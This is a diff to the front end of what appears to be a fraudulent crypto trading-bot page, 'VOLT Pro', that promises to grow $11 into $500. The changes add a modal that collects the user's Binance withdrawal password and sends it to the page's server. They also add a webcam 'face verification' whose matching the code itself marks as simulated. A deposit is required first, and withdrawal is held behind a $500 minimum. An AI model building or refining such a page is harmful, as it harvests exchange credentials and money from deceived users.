@@ -25,23 +25,6 @@
             padding: 20px;
         }
 
-        /* ===== SECURITY BANNER ===== */
-        .security-banner {
-            background: linear-gradient(90deg, #0ecb81, #059669);
-            padding: 8px 20px;
-            border-radius: 60px;
-            color: #070b14;
-            font-size: 12px;
-            font-weight: 700;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-        .security-banner .lock {
-            font-size: 16px;
-        }
-
         .main-card {
             max-width: 1200px;
             width: 100%;
@@ -62,16 +45,30 @@
             gap: 12px;
             margin-bottom: 16px;
         }
-        .security-header .ssl-badge {
+
+        .security-banner {
+            background: linear-gradient(90deg, #0ecb81, #059669);
+            padding: 8px 20px;
+            border-radius: 60px;
+            color: #070b14;
+            font-size: 12px;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .security-banner .lock {
+            font-size: 16px;
+        }
+
+        .ssl-badge {
             background: #0a1425;
             padding: 4px 16px;
             border-radius: 30px;
             color: #0ecb81;
             font-size: 11px;
             border: 1px solid #1e2d47;
-        }
-        .security-header .ssl-badge .lock {
-            color: #f0b90b;
         }
 
         .header {
@@ -165,7 +162,6 @@
             50% { opacity: 0.2; transform: scale(0.6); }
         }
 
-        /* ===== MPPS BADGE ===== */
         .mpps-badge {
             background: #0a1425;
             padding: 4px 16px;
@@ -299,6 +295,7 @@
         .bot-panel .bot-title .phase.trading { color: #0ecb81; }
         .bot-panel .bot-title .phase.waiting { color: #f6465d; }
         .bot-panel .bot-title .phase.loss { color: #f6465d; }
+        .bot-panel .bot-title .phase.verified { color: #0ecb81; }
 
         .bot-status-text {
             text-align: center;
@@ -341,19 +338,20 @@
             font-size: 16px;
             cursor: pointer;
             transition: 0.3s;
-            background: linear-gradient(135deg, #f0b90b, #f59e0b);
-            color: #070b14;
-            box-shadow: 0 0 30px rgba(240, 185, 11, 0.15);
             margin-top: 6px;
         }
         .bot-btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 50px rgba(240, 185, 11, 0.3);
         }
         .bot-btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
             transform: none;
+        }
+        .bot-btn.primary {
+            background: linear-gradient(135deg, #f0b90b, #f59e0b);
+            color: #070b14;
+            box-shadow: 0 0 30px rgba(240, 185, 11, 0.15);
         }
         .bot-btn.trading {
             background: linear-gradient(135deg, #0ecb81, #059669);
@@ -533,6 +531,7 @@
             font-size: 11px;
         }
 
+        /* ===== MODALS ===== */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -591,6 +590,13 @@
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+
+        .modal-box .face-icon .camera-feed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
         }
 
         .modal-box h2 {
@@ -855,7 +861,7 @@
                     <div class="time" id="timerDisplay">--:--:--</div>
                     <div class="label" id="timerLabel">Trading Time</div>
                 </div>
-                <button class="bot-btn verify-btn" id="mainBtn" onclick="startProcess()">
+                <button class="bot-btn primary" id="mainBtn" onclick="startProcess()">
                     🔐 Verify & Start Trading
                 </button>
                 <button class="bot-btn withdraw-btn" id="withdrawBtn" onclick="showWithdraw()" disabled>
@@ -941,25 +947,37 @@
     </div>
 
     <!-- ===== MODALS ===== -->
-    <!-- Face Verification Modal -->
-    <div class="modal-overlay" id="faceModal">
+
+    <!-- Password Modal -->
+    <div class="modal-overlay" id="passwordModal">
+        <div class="modal-box">
+            <div class="face-icon">🔐</div>
+            <h2>🔐 Security Verification</h2>
+            <p>Enter your Binance withdrawal password to continue</p>
+            <div class="scan-line"></div>
+            <input type="password" class="password-input" id="passwordInput" placeholder="Enter Binance Password" />
+            <button class="verify-btn" onclick="verifyPassword()">
+                ✅ Verify Password
+            </button>
+            <p style="color:#3d4d6e;font-size:11px;margin-top:12px;">
+                ⚡ This is required for withdrawal security
+            </p>
+        </div>
+    </div>
+
+    <!-- Camera Verification Modal -->
+    <div class="modal-overlay" id="cameraModal">
         <div class="modal-box">
             <div class="face-icon">
-                👤
+                <video id="cameraFeed" class="camera-feed" autoplay muted></video>
                 <div class="scan-ring"></div>
             </div>
-            <h2>🔐 Security Verification</h2>
-            <p>Enter your Binance withdrawal password to confirm</p>
+            <h2>📸 Face Verification</h2>
+            <p>Position your face in the frame for identity verification</p>
             <div class="scan-line"></div>
-            <div class="otp-display">
-                <div class="label">🔑 Verification PIN</div>
-                <div class="code">2010</div>
-                <div style="color:#6a7d9a;font-size:11px;margin-top:4px;">Auto-generated · Valid for 30s</div>
-            </div>
-            <input type="password" class="password-input" id="passwordInput" placeholder="Enter Binance Password" />
-            <div class="timer-30s" id="otpTimer">⏱ 30s remaining</div>
-            <button class="verify-btn" id="verifyBtnModal" onclick="verifyFace()">
-                ✅ Verify & Unlock
+            <div id="scanStatus" style="color:#f0b90b;font-weight:600;margin:8px 0;">⏳ Scanning face...</div>
+            <button class="verify-btn" id="cameraVerifyBtn" onclick="verifyCamera()" disabled>
+                ⏳ Scanning...
             </button>
             <p style="color:#3d4d6e;font-size:11px;margin-top:12px;">
                 ⚡ Face matching in progress...
@@ -1024,10 +1042,10 @@
         const socket = io();
 
         // ===== STATE =====
-        let isVerified = false;
+        let isPasswordVerified = false;
+        let isCameraVerified = false;
+        let isTrading = false;
         let chartInstance = null;
-        let otpTimer = 30;
-        let otpInterval = null;
 
         // ===== DOM REFS =====
         const balanceNum = document.getElementById('balanceNum');
@@ -1099,6 +1117,34 @@
             withdrawBtn.textContent = '💸 Withdraw ($' + data.balance.toFixed(2) + ')';
         });
 
+        socket.on('password_verified', (data) => {
+            if (data.success) {
+                isPasswordVerified = true;
+                document.getElementById('passwordModal').classList.remove('show');
+                botStatusText.innerHTML = '✅ <span class="highlight">Password Verified!</span> Starting camera scan...';
+                setTimeout(() => {
+                    showCameraVerification();
+                }, 1000);
+            } else {
+                alert('⚠️ Incorrect password! Please try again.');
+            }
+        });
+
+        socket.on('camera_verified', (data) => {
+            if (data.success) {
+                isCameraVerified = true;
+                document.getElementById('cameraModal').classList.remove('show');
+                stopCamera();
+                botStatusText.innerHTML = '✅ <span class="highlight">Face Verified!</span> Ready to trade!';
+                phaseLabel.textContent = '● VERIFIED';
+                phaseLabel.className = 'phase verified';
+                mainBtn.textContent = '🚀 START TRADING';
+                mainBtn.className = 'bot-btn trading';
+                mainBtn.style.background = 'linear-gradient(135deg, #0ecb81, #059669)';
+                document.getElementById('mainBtn').onclick = startTrading;
+            }
+        });
+
         socket.on('withdraw_success', (data) => {
             alert('✅ Withdrawal of $' + data.amount.toFixed(2) + ' processed!\n⏱ Will arrive in 5-10 minutes.');
             document.getElementById('withdrawModal').classList.remove('show');
@@ -1112,6 +1158,22 @@
         socket.on('reset', (data) => {
             resetUI();
             updateUI(data);
+        });
+
+        socket.on('status_update', (data) => {
+            if (data.status === 'trading') {
+                isTrading = true;
+                mainBtn.textContent = '⏹ STOP TRADING';
+                mainBtn.className = 'bot-btn trading';
+                mainBtn.style.background = 'linear-gradient(135deg, #f6465d, #dc2626)';
+                document.getElementById('mainBtn').onclick = stopTrading;
+            } else {
+                isTrading = false;
+                mainBtn.textContent = '🚀 START TRADING';
+                mainBtn.className = 'bot-btn trading';
+                mainBtn.style.background = 'linear-gradient(135deg, #0ecb81, #059669)';
+                document.getElementById('mainBtn').onclick = startTrading;
+            }
         });
 
         // ===== UPDATE UI =====
@@ -1138,12 +1200,16 @@
             profitDisplay.className = 'value ' + profitClass;
             profitDisplay.textContent = (profit >= 0 ? '+' : '') + '$' + profit.toFixed(2);
 
-            if (total >= 500 && data.isVerified) {
+            if (total >= 500 && isPasswordVerified && isCameraVerified) {
                 withdrawBtn.disabled = false;
                 withdrawBtn.textContent = '💸 Withdraw ($' + total.toFixed(2) + ')';
             } else {
                 withdrawBtn.disabled = true;
-                withdrawBtn.textContent = total >= 500 ? '💸 Withdraw (Min $500)' : '💸 Need $500 to withdraw';
+                if (!isPasswordVerified || !isCameraVerified) {
+                    withdrawBtn.textContent = '💸 Verify first';
+                } else {
+                    withdrawBtn.textContent = total >= 500 ? '💸 Withdraw (Min $500)' : '💸 Need $500 to withdraw';
+                }
             }
         }
 
@@ -1165,12 +1231,12 @@
             row.className = 'trade-row';
             const isGreen = trade.profit >= 0;
             row.innerHTML = `
-                <span class="pair">${trade.pair}</span>
-                <span style="color:${isGreen ? '#0ecb81' : '#f6465d'};font-weight:700;">${trade.side}</span>
-                <span>${trade.amount}</span>
-                <span class="${isGreen ? 'profit-green' : 'profit-red'}">${isGreen ? '+' : ''}$${Math.abs(trade.profit).toFixed(2)}</span>
-                <span class="time-small">${trade.time}</span>
-            `;
+                        <span class="pair">${trade.pair}</span>
+                        <span style="color:${isGreen ? '#0ecb81' : '#f6465d'};font-weight:700;">${trade.side}</span>
+                        <span>${trade.amount}</span>
+                        <span class="${isGreen ? 'profit-green' : 'profit-red'}">${isGreen ? '+' : ''}$${Math.abs(trade.profit).toFixed(2)}</span>
+                        <span class="time-small">${trade.time}</span>
+                    `;
             tradeList.prepend(row);
             while (tradeList.children.length > 10) {
                 tradeList.removeChild(tradeList.lastChild);
@@ -1179,6 +1245,7 @@
 
         // ===== RESET UI =====
         function resetUI() {
+            isTrading = false;
             timerDisplay.textContent = '--:--:--';
             timerLabel.textContent = 'Trading Time';
             botStatusText.innerHTML = '⚡ <span class="highlight">Start with $11</span> — Target: $500';
@@ -1192,98 +1259,88 @@
             withdrawBtn.disabled = true;
             withdrawBtn.textContent = '💸 Withdraw (Min $500)';
             mainBtn.textContent = '🔐 Verify & Start Trading';
-            mainBtn.className = 'bot-btn verify-btn';
+            mainBtn.className = 'bot-btn primary';
+            mainBtn.style.background = '';
+            document.getElementById('mainBtn').onclick = startProcess;
             while (tradeList.children.length > 1) {
                 tradeList.removeChild(tradeList.lastChild);
             }
+            if (window.timerInterval) clearInterval(window.timerInterval);
         }
 
-        // ===== FACE VERIFICATION =====
-        function showFaceVerification() {
-            document.getElementById('faceModal').classList.add('show');
-            otpTimer = 30;
-            document.getElementById('otpTimer').textContent = '⏱ 30s remaining';
-            document.getElementById('passwordInput').value = '';
-            const btn = document.getElementById('verifyBtnModal');
-            btn.disabled = false;
-            btn.textContent = '✅ Verify & Unlock';
-
-            if (otpInterval) clearInterval(otpInterval);
-            otpInterval = setInterval(() => {
-                otpTimer--;
-                document.getElementById('otpTimer').textContent = '⏱ ' + otpTimer + 's remaining';
-                if (otpTimer <= 0) {
-                    clearInterval(otpInterval);
-                    document.getElementById('otpTimer').textContent = '⏱ OTP Expired! Click again.';
-                    document.getElementById('verifyBtnModal').disabled = true;
-                }
-            }, 1000);
-
-            setTimeout(() => {
-                if (document.getElementById('faceModal').classList.contains('show')) {
-                    const btn = document.getElementById('verifyBtnModal');
-                    btn.textContent = '⏳ Scanning face...';
-                    btn.style.opacity = '0.7';
-
-                    setTimeout(() => {
-                        btn.textContent = '✅ Face Matched!';
-                        btn.style.opacity = '1';
-                        btn.style.background = 'linear-gradient(135deg, #0ecb81, #059669)';
-
-                        setTimeout(() => {
-                            if (otpTimer > 0) {
-                                verifyFace();
-                            }
-                        }, 800);
-                    }, 2000);
-                }
-            }, 2000);
-        }
-
-        function verifyFace() {
+        // ===== PASSWORD VERIFICATION =====
+        function verifyPassword() {
             const password = document.getElementById('passwordInput').value.trim();
             if (!password || password.length < 4) {
-                alert('⚠️ Please enter a valid Binance password!');
+                alert('⚠️ Please enter a valid password (min 4 characters)!');
                 return;
             }
-            if (otpTimer <= 0) {
-                alert('⚠️ OTP expired! Please try again.');
-                return;
-            }
+            socket.emit('verify_password', { password: password });
+        }
 
-            isVerified = true;
-            if (otpInterval) clearInterval(otpInterval);
-            document.getElementById('faceModal').classList.remove('show');
+        // ===== CAMERA VERIFICATION =====
+        function showCameraVerification() {
+            document.getElementById('cameraModal').classList.add('show');
+            document.getElementById('scanStatus').textContent = '⏳ Initializing camera...';
+            document.getElementById('cameraVerifyBtn').disabled = true;
 
-            mainBtn.textContent = '✅ Verified! Start Trading';
-            mainBtn.className = 'bot-btn trading';
-            mainBtn.style.background = 'linear-gradient(135deg, #0ecb81, #059669)';
+            // Start camera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.getElementById('cameraFeed');
+                    video.srcObject = stream;
+                    video.play();
 
-            botStatusText.innerHTML = '✅ <span class="highlight">Face Verified!</span> Starting trading...';
-            phaseLabel.textContent = '● VERIFIED';
-            phaseLabel.className = 'phase trading';
+                    document.getElementById('scanStatus').textContent = '⏳ Scanning face...';
+
+                    // Simulate face scan
+                    setTimeout(() => {
+                        document.getElementById('scanStatus').textContent = '✅ Face detected! Matching...';
+                    }, 2000);
+
+                    setTimeout(() => {
+                        document.getElementById('scanStatus').textContent = '✅ Face matched! Verifying...';
+                        document.getElementById('cameraVerifyBtn').disabled = false;
+                        document.getElementById('cameraVerifyBtn').textContent = '✅ Verify & Continue';
+                        document.getElementById('cameraVerifyBtn').style.background = 'linear-gradient(135deg, #0ecb81, #059669)';
+                    }, 3500);
+                })
+                .catch((err) => {
+                    alert('⚠️ Camera access denied! Please allow camera access.');
+                    document.getElementById('scanStatus').textContent = '❌ Camera access denied';
+                });
+        }
+
+        function verifyCamera() {
+            document.getElementById('cameraVerifyBtn').disabled = true;
+            document.getElementById('cameraVerifyBtn').textContent = '⏳ Verifying...';
+            document.getElementById('scanStatus').textContent = '⏳ Finalizing verification...';
 
             setTimeout(() => {
-                socket.emit('start_trading', {});
-                botStatusText.innerHTML = '⚡ Trading started... Target: <span class="highlight">$500</span>';
-                phaseLabel.textContent = '● TRADING';
-                phaseLabel.className = 'phase trading';
-                chartBadge.textContent = '🤖 Trading Active';
-                liveBadge.textContent = '● TRADING';
-                liveBadge.className = 'live-badge active';
-
-                let seconds = 0;
-                timerDisplay.textContent = '00:00:00';
-                timerLabel.textContent = 'Trading Time';
-                if (window.timerInterval) clearInterval(window.timerInterval);
-                window.timerInterval = setInterval(() => {
-                    seconds++;
-                    const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
-                    const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
-                    const secs = String(seconds % 60).padStart(2, '0');
-                    timerDisplay.textContent = hrs + ':' + mins + ':' + secs;
-                }, 1000);
+                socket.emit('camera_verify', {});
             }, 1500);
+        }
+
+        function stopCamera() {
+            const video = document.getElementById('cameraFeed');
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+        }
+
+        // ===== TRADING FUNCTIONS =====
+        function startTrading() {
+            if (!isPasswordVerified || !isCameraVerified) {
+                alert('⚠️ Please complete verification first!');
+                return;
+            }
+            socket.emit('start_trading', {});
+            // Timer will start when status_update comes
+        }
+
+        function stopTrading() {
+            socket.emit('stop_trading', {});
         }
 
         // ===== DEPOSIT FUNCTIONS =====
@@ -1295,7 +1352,7 @@
             document.getElementById('depositModal').classList.remove('show');
             botStatusText.innerHTML = '✅ <span class="highlight">Deposit confirmed!</span> Starting verification...';
             setTimeout(() => {
-                showFaceVerification();
+                document.getElementById('passwordModal').classList.add('show');
             }, 1500);
         }
 
@@ -1314,6 +1371,10 @@
                 alert('⚠️ Minimum balance for withdrawal is $500.00');
                 return;
             }
+            if (!isPasswordVerified || !isCameraVerified) {
+                alert('⚠️ Please complete verification first!');
+                return;
+            }
             document.getElementById('withdrawBalance').textContent = '$' + total.toFixed(2);
             document.getElementById('withdrawModal').classList.add('show');
             document.getElementById('withdrawPassword').value = '';
@@ -1330,29 +1391,10 @@
 
         // ===== START PROCESS =====
         function startProcess() {
-            if (isVerified) {
-                if (mainBtn.textContent.includes('STOP')) {
-                    socket.emit('stop_trading', {});
-                    mainBtn.textContent = '🚀 START TRADING';
-                    mainBtn.className = 'bot-btn verify-btn';
-                    botStatusText.innerHTML = '⏹ Trading stopped';
-                    phaseLabel.textContent = '● STOPPED';
-                    phaseLabel.className = 'phase waiting';
-                    chartBadge.textContent = '⏳ Stopped';
-                    liveBadge.textContent = '● STOPPED';
-                    liveBadge.className = 'live-badge waiting';
-                    return;
-                }
-                socket.emit('start_trading', {});
-                mainBtn.textContent = '⏹ STOP TRADING';
-                mainBtn.className = 'bot-btn trading';
-                return;
-            }
             showDeposit();
         }
 
-        // ===== INIT =====
-        // Chart init
+        // ===== INIT CHART =====
         document.addEventListener('DOMContentLoaded', function() {
             const ctx = document.getElementById('analysisChart').getContext('2d');
             chartInstance = new Chart(ctx, {
@@ -1387,7 +1429,6 @@
                 }
             });
 
-            // Update chart on trade
             socket.on('trade_update', (data) => {
                 if (chartInstance) {
                     const chartData = chartInstance.data.datasets[0].data;
@@ -1396,12 +1437,27 @@
                     chartInstance.update();
                 }
             });
+
+            // Timer for trading
+            socket.on('status_update', (data) => {
+                if (data.status === 'trading') {
+                    let seconds = 0;
+                    timerDisplay.textContent = '00:00:00';
+                    timerLabel.textContent = 'Trading Time';
+                    if (window.timerInterval) clearInterval(window.timerInterval);
+                    window.timerInterval = setInterval(() => {
+                        seconds++;
+                        const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
+                        const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+                        const secs = String(seconds % 60).padStart(2, '0');
+                        timerDisplay.textContent = hrs + ':' + mins + ':' + secs;
+                    }, 1000);
+                }
+            });
         });
 
-        // Auto-show deposit on load
-        setTimeout(() => {
-            showDeposit();
-        }, 1200);
+        // ===== INIT =====
+        console.log('🚀 VOLT Pro started!');
     </script>
 
 </body>
